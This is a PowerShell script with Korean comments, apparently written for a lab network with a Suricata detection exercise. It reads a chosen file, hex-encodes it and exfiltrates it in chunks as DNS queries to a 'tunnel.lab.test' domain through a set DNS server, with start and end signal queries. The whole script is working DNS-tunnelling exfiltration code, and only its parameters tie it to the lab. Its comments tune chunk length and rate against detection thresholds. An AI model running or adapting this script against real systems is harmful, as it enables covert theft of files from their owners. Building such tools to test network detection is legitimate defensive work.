# DNS 터널링 유출 - Win10 송신 스크립트
# 사용법: .\win10_exfil.ps1 -FilePath "C:\secret.csv"
# 환경: 내부망 192.168.100.0/24 / DNS 192.168.100.53

param(
    [string]$FilePath  = "C:\exfil_target.txt",
    [string]$DnsServer = "192.168.100.53",
    [string]$Domain    = "tunnel.lab.test",
    [int]   $DelayMs   = 100   # 100ms 간격 → 10초에 ~100회 (탐지 임계 초과)
)

# ── 1. 파일 읽기 & 16진수 변환 ──────────────────────────────
if (-not (Test-Path $FilePath)) {
    Write-Error "파일을 찾을 수 없음: $FilePath"
    exit 1
}
$bytes = [System.IO.File]::ReadAllBytes($FilePath)
$hex   = -join ($bytes | ForEach-Object { $_.ToString("x2") })

# ── 2. 청크 분할 ─────────────────────────────────────────────
# DNS 레이블 최대 63자 / seq(4) + data(50) = 54자 → Suricata "50자 이상" 탐지 트리거
$CHUNK = 50
$chunks = [System.Collections.Generic.List[string]]::new()
for ($i = 0; $i -lt $hex.Length; $i += $CHUNK) {
    $chunks.Add($hex.Substring($i, [Math]::Min($CHUNK, $hex.Length - $i)))
}

Write-Host "[*] 파일  : $FilePath ($($bytes.Length) bytes)"
Write-Host "[*] 청크수: $($chunks.Count) (레이블 길이 ~54자)"
Write-Host "[*] DNS   : $DnsServer  /  도메인: $Domain"

# ── 3. 세션 시작 신호 ────────────────────────────────────────
# 형식: start{총청크수:04x}{파일크기:04x}.tunnel.lab.test
$startLabel = "start{0:x4}{1:x4}" -f $chunks.Count, $bytes.Length
Resolve-DnsName -Name "$startLabel.$Domain" -Server $DnsServer -Type A `
    -ErrorAction SilentlyContinue | Out-Null
Write-Host "[>] START 신호 전송: $startLabel.$Domain"
Start-Sleep -Milliseconds $DelayMs

# ── 4. 데이터 청크 전송 ──────────────────────────────────────
# 형식: {seq:04x}{hex50자}.tunnel.lab.test
for ($i = 0; $i -lt $chunks.Count; $i++) {
    $label = "{0:x4}{1}" -f $i, $chunks[$i]
    $query = "$label.$Domain"
    Write-Host "[>] [$($i+1)/$($chunks.Count)] $query"
    Resolve-DnsName -Name $query -Server $DnsServer -Type A `
        -ErrorAction SilentlyContinue | Out-Null
    Start-Sleep -Milliseconds $DelayMs
}

# ── 5. 세션 종료 신호 ────────────────────────────────────────
$endLabel = "end{0:x4}" -f $chunks.Count
Resolve-DnsName -Name "$endLabel.$Domain" -Server $DnsServer -Type A `
    -ErrorAction SilentlyContinue | Out-Null
Write-Host "[+] END 신호 전송: $endLabel.$Domain"
Write-Host "[+] 유출 완료."
